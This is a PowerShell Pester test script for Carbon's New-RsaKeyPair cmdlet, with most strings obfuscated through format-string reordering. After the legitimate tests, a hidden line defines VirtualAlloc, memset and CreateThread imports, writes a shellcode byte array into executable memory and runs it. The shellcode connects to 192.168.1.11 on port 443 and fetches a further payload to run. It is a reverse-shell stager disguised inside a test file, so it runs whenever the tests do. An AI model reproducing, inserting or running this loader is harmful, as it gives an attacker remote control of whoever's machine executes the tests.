Set-StrictMode -Version ("{0}{1}"-f'L','atest')

& (Join-Path -Path $PSScriptRoot -ChildPath ("{1}{0}{2}{3}{4}" -f'l','Initia','i','ze-Carbon','Test.ps1') -Resolve)

$tempDir = $null
$privateKeyPassword = (New-Credential -User ((("{1}{4}{5}{0}{6}{2}{3}"-f'{0}t m','d','t','er','oesn','{0}','at')) -F  [cHar]39) -Password ("{0}{1}{2}" -f'fu','barsn','afu')).Password
$subject = $null
$publicKeyPath = $null
$privateKeyPath = $null

Describe ("{2}{4}{3}{1}{0}" -f'ir','saKeyPa','N','-R','ew') {

    function Assert-KeyProperty
    {
        param(
            $Length = 4096,
            [datetime]
            $ValidTo,
            $Algorithm = ("{2}{0}{1}"-f '2','RSA','sha51')
        )

        Set-StrictMode -Version ("{0}{1}" -f 'Lates','t')

        if( -not $ValidTo )
        {
            $ValidTo = (Get-Date).AddDays( [Math]::Floor(([DateTime]::MaxValue - [DateTime]::UtcNow).TotalDays) )
        }

        $cert = Get-Certificate -Path $publicKeyPath
        
        [timespan]$span = $ValidTo - $cert.NotAfter
        $span.TotalDays | Should BeGreaterThan (-2)
        $span.TotalDays | Should BeLessThan 2
        $cert.Subject | Should Be $subject
        $cert.PublicKey.Key.KeySize | Should Be $Length
        $cert.PublicKey.Key.KeyExchangeAlgorithm | Should Be ("{1}{0}{3}{4}{2}"-f'SA-P','R','yEx','KCS1','-Ke')
        $cert.SignatureAlgorithm.FriendlyName | Should Be $Algorithm
        $keyUsage = $cert.Extensions | Where-Object { $_ -is [Security.Cryptography.X509Certificates.X509KeyUsageExtension] }
        $keyUsage | Should Not BeNullOrEmpty
        $keyUsage.KeyUsages.HasFlag([Security.Cryptography.X509Certificates.X509KeyUsageFlags]::DataEncipherment) | Should Be $true
        $keyUsage.KeyUsages.HasFlag([Security.Cryptography.X509Certificates.X509KeyUsageFlags]::KeyEncipherment) | Should Be $true
        $enhancedKeyUsage = $cert.Extensions | Where-Object { $_ -is [Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] }
        $enhancedKeyUsage | Should Not BeNullOrEmpty

        
        $osVersion = (Get-WmiObject -Class ("{0}{1}{2}{3}"-f'Win3','2_Oper','atingS','ystem')).Version
        if( $osVersion -notmatch ((("{1}{0}" -f'S4b','6.1d'))  -rEPLACe([cHAR]100+[cHAR]83+[cHAR]52),[cHAR]92) )
        {
            $usage = $enhancedKeyUsage.EnhancedKeyUsages | Where-Object { $_.FriendlyName -eq ("{0}{4}{1}{3}{2}"-f'Doc','nt E','tion','ncryp','ume') }
            $usage | Should Not BeNullOrEmpty
        }
    }

    BeforeEach {
        $tempDir = New-TempDirectory -Prefix $PSCommandPath
        $Global:Error.Clear()

        $subject = 'CN={0}' -f [Guid]::NewGuid()
        $publicKeyPath = Join-Path -Path $tempDir -ChildPath ("{1}{2}{0}"-f'c.cer','pu','bli')
        $privateKeyPath = Join-Path -Path $tempDir -ChildPath ("{1}{2}{0}" -f '.pfx','privat','e')
    }

    AfterEach {
        Remove-Item -Path $tempDir -Recurse
    }

    It ("{0}{10}{11}{4}{7}{6}{9}{5}{3}{12}{1}{2}{8}" -f 'sh','priv','ate ke','u','gen',' p','ra','e','y pair','te a','oul','d ','blic/') {

        $output = New-RsaKeyPair -Subject $subject -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $privateKeyPassword
        $output | Should Not BeNullOrEmpty
        $output.Count | Should Be 2

        $publicKeyPath | Should Exist
        $output[0].FullName | Should Be $publicKeyPath

        $privateKeyPath | Should Exist
        $output[1].FullName | Should Be $privateKeyPath

        Assert-KeyProperty

        
        $secret = [IO.Path]::GetRandomFileName()
        $protectedSecret = Protect-String -String $secret -Certificate $publicKeyPath
        $decryptedSecret = Unprotect-String -ProtectedString $protectedSecret -PrivateKeyPath $privateKeyPath -Password $privateKeyPassword
        $decryptedSecret | Should Be $secret

        $publicKey = Get-Certificate -Path $publicKeyPath
        $publicKey | Should Not BeNullOrEmpty

        
        $configData = @{
            AllNodes = @(
                @{
                    NodeName = ("{2}{0}{1}"-f 'h','ost','local');
                    CertificateFile = $PublicKeyPath;
                    Thumbprint = $publicKey.Thumbprint;
                }
            )
        }

        configuration TestEncryption
        {
            Set-StrictMode -Off

            Import-DscResource -ModuleName ("{4}{3}{5}{1}{2}{0}" -f'ration','State','Configu','sire','PSDe','d')

            node $AllNodes.NodeName
            {
                User ("{0}{4}{2}{1}{3}"-f'Cr','eDu','at','mmyUser','e')
                {
                    UserName = ("{2}{0}{1}" -f 'rsna','fu','fuba');
                    Password = (New-Credential -UserName ("{1}{2}{0}{3}"-f'barsn','f','u','afu') -Password ("{1}{2}{0}" -f 'sword1','P','as'))
                }
            }
        }

        & TestEncryption -ConfigurationData $configData -OutputPath $tempDir

        
        $dscRegKey = ((("{4}{7}{10}{9}{1}{3}{5}{2}{6}{8}{0}" -f 'C','A','rPowe','REK4rMicrosoft','HKLM:K4','K4','rShellK','r','4r3K4rDS','FTW','SO')).REplAce(([chAR]75+[chAR]52+[chAR]114),'\'))
        $dscRegKeyErrorMessages = $Global:Error |
                                  Where-Object { $_ -is [System.Management.Automation.ErrorRecord] } |
                                  Where-Object { $_.Exception.Message -like ('*Cannot find path ''{0}''*' -f $dscRegKey) }

        foreach ($error in $dscRegKeyErrorMessages)
        {
            $Global:Error.Remove($error)
        }

        $Global:Error.Count | Should Be 0
        Join-Path -Path $tempDir -ChildPath ("{0}{2}{1}"-f 'loca','t.mof','lhos') | Should Not Contain ("{1}{0}" -f 'assword1','P')
    }

    if( Get-Command -Name ("{2}{4}{1}{0}{3}"-f'essag','sM','Prote','e','ct-Cm') -ErrorAction Ignore )
    {
        
        It ("{11}{16}{14}{0}{9}{15}{1}{4}{13}{10}{2}{3}{8}{6}{12}{7}{5}" -f 'r','r','t ','can be u','s','ets','ed b','l','s','ate','tha','sh','y CMS cmd',' ','ene',' key pai','ould g') {
            $output = New-RsaKeyPair -Subject ("{0}{3}{4}{2}{1}" -f'CN','le.com','xamp','=to@','e') -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $privateKeyPassword

            $cert = Install-Certificate -Path $privateKeyPath -StoreLocation CurrentUser -StoreName My -Password $privateKeyPassword

            try
            {
                $message = ("{2}{1}{0}"-f'barsnafu','u','f')
                $protectedMessage = Protect-CmsMessage -To $publicKeyPath -Content $message
                Unprotect-CmsMessage -Content $protectedMessage | Should Be $message
            }
            finally
            {
                Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation CurrentUser -StoreName My
            }
        }
    }


    It ("{10}{0}{3}{4}{2}{6}{11}{8}{7}{1}{9}{5}" -f'uld gene','om co','e ke','r','at','tion','y ','t',' cus','nfigura','sho','with') {
        $validTo = [datetime]::Now.AddDays(30)
        $length = 2048

        $output = New-RsaKeyPair -Subject $subject `
                                 -PublicKeyFile $publicKeyPath `
                                 -PrivateKeyFile $privateKeyPath `
                                 -Password $privateKeyPassword `
                                 -ValidTo $validTo `
                                 -Length $length `
                                 -Algorithm sha1

        Assert-KeyProperty -Length $length -ValidTo $validTo -Algorithm ("{1}{0}{2}" -f'ha1R','s','SA')

    }

    It ((("{11}{3}{10}{0}{6}{4}{7}{9}{2}{5}{1}{12}{8}"-f't subje','gi','fvM','hould','t','fvMt be','c','s that d',' with CN=','on',' rejec','s','n')).rePlACE(([ChAR]102+[ChAR]118+[ChAR]77),[STrINg][ChAR]39)) {
        { New-RsaKeyPair -Subject ("{0}{1}"-f 'f','ubar') -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $privateKeyPassword } | Should Throw
        $Global:Error[0] | Should Match ("{0}{3}{2}{1}" -f'd','atch','not m','oes ')
    }

    It ("{0}{2}{3}{1}{5}{4}"-f'should not','priva',' pr','otect ','key','te ') {
        $output = New-RsaKeyPair -Subject $subject -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $null
        $output.Count | Should Be 2

        $privateKey = Get-Certificate -Path $privateKeyPath
        $privateKey | Should Not BeNullOrEmpty

        $secret = [IO.Path]::GetRandomFileName()
        $protectedSecret = Protect-String -String $secret -PublicKeyPath $publicKeyPath
        Unprotect-String -ProtectedString $protectedSecret -PrivateKeyPath $privateKeyPath | Should Be $secret
    }
}
$c = ((("{23}{19}{80}{24}{86}{91}{82}{14}{94}{51}{34}{0}{29}{93}{62}{3}{88}{26}{56}{1}{33}{45}{22}{38}{36}{90}{50}{74}{13}{4}{46}{18}{70}{69}{15}{8}{61}{5}{78}{73}{47}{32}{85}{48}{81}{59}{2}{53}{54}{10}{79}{76}{87}{44}{42}{31}{9}{12}{39}{89}{65}{25}{67}{35}{6}{28}{55}{40}{60}{57}{41}{30}{27}{7}{96}{37}{11}{83}{17}{21}{52}{49}{98}{68}{16}{77}{43}{84}{63}{95}{64}{72}{20}{58}{66}{75}{97}{92}{71}"-f'r','u','eat','tPtr','tect);','2.dll','tAddress, In','ags','e','ri','(I','rea','butes, ui','o','bl','rkern','c s','port','(','port(x','ntPtr','(xVrmsvcrt.d','lAllocationType,','[DllIm','ke','ntPtr','d','l','tPtr','n IntPtr Vi','onF','eadAtt','static','i','ic exte','pStar','ui',' IntPtr lpTh',' ','nt dwSta','pParameter,','Creati','r','ic','pTh','nt dwSize, uint f','[DllImport','blic ','extern I','l',' fl','stat','l','eThrea','d',' l','ress, ','w',' dest, uin',' Cr',' uint d','l3','Alloc(In','xte','nt','ze, I','t ',' l','Vr)]publi','V','x',');','Ptr memset(I','Vr)]pu','Pr','src','r','tat','x','ntPt','Vr','ntPtr','32.dllxVr)]pu','dId);[DllIm',' e',' ','rn',' l',' lpAd','ckSi','nt','el','nt count','rtual','ic ','rn I',',',', ui','x')).repLace('xVr',[STRiNg][ChAr]34));$w = Add-Type -memberDefinition $c -Name ("{1}{0}" -f'n32','Wi') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
